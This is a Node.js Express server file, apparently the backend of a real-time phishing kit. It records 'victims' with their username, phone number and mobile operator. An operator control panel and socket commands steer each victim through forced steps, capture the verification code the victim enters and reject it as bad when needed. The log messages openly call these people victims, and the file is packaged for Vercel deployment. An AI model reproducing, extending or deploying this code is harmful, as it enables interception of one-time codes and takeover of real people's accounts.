const express = require('express');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
app.use(express.json());

const sessions = new Map();
let ioInstance = null;

function getIo() {
    if (!ioInstance) {
        const httpServer = require('http').createServer(app);
        ioInstance = new Server(httpServer, {
            path: '/socket.io',
            cors: { origin: "*" }
        });

        ioInstance.on('connection', (socket) => {
            console.log('Client Socket connecté');

            socket.on('joinSession', (sessionId) => {
                socket.join(`session-${sessionId}`);
                console.log(`[+] Victime join room: session-${sessionId}`);
            });

            socket.on('chatMessage', (data) => {
                ioInstance.to(`session-${data.sessionId}`).emit('command', { 
                    action: 'chatMessage', 
                    message: data.message,
                    from: data.from 
                });
            });
        });
    }
    return ioInstance;
}

// ====================== ROUTES ======================
app.post('/api/submit', (req, res) => {
    const { username, phone, operator, sessionId } = req.body;
    if (!sessionId || !username || !phone) return res.status(400).json({ error: "Données manquantes" });

    sessions.set(sessionId, {
        username: username.trim(),
        phone: phone.trim(),
        operator: (operator || "Inconnu").trim(),
        status: "waiting",
        code: null,
        forceStep2: false,
        timestamp: Date.now()
    });
    console.log(`[+] Nouvelle victime → ${sessionId} | ${username}`);
    res.json({ success: true });
});

app.post('/api/force-step2', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step2_forced";
        v.forceStep2 = true;
        getIo().to(`session-${sessionId}`).emit('command', { action: 'forceStep2' });
    }
    res.json({ success: true });
});

app.post('/api/force-step3', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step3";
        getIo().to(`session-${sessionId}`).emit('command', { action: 'forceStep3' });
    }
    res.json({ success: true });
});

app.post('/api/mark-code-sent', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "code_received";
        getIo().to(`session-${sessionId}`).emit('command', { action: 'codeSent' });
    }
    res.json({ success: true });
});

app.post('/api/code', (req, res) => {
    const { sessionId, code } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.code = code;
        v.status = "code_received";
        getIo().to(`session-${sessionId}`).emit('command', { action: 'codeEntered', code });
    }
    res.json({ success: true });
});

app.post('/api/bad-code', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        getIo().to(`session-${sessionId}`).emit('command', { action: 'badCode' });
    }
    res.json({ success: true });
});

app.get('/api/victims', (req, res) => {
    const arr = Array.from(sessions.entries())
        .map(([id, data]) => ({ sessionId: id, ...data }))
        .sort((a, b) => b.timestamp - a.timestamp);
    res.json(arr);
});

app.post('/api/delete-session', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        sessions.delete(sessionId);
        console.log(`[-] Session supprimée : ${sessionId}`);
        getIo().to(`session-${sessionId}`).emit('command', { action: 'sessionDeleted' });
    }
    res.json({ success: true });
});

// Servir les fichiers statiques (zen/)
app.use(express.static(path.join(__dirname, '../zen')));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, '../zen/index.html')));
app.get('/control', (req, res) => res.sendFile(path.join(__dirname, '../zen/control.html')));

// Export pour Vercel
module.exports = app;
